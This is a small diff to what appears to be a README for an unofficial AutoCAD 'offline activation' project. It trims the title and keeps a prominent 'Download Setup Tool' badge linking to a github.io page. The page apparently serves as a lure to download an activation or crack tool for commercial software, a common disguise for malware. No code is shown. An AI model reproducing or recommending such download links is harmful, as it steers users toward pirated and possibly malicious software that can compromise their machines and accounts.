@@ -1,4 +1,4 @@
-# 🧮 AutoCAD — Offline Activation Guide
+# 🧮 AutoCAD 
 
 [![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-red)](https://autocad-offline-activation-guide.github.io/.github)
 
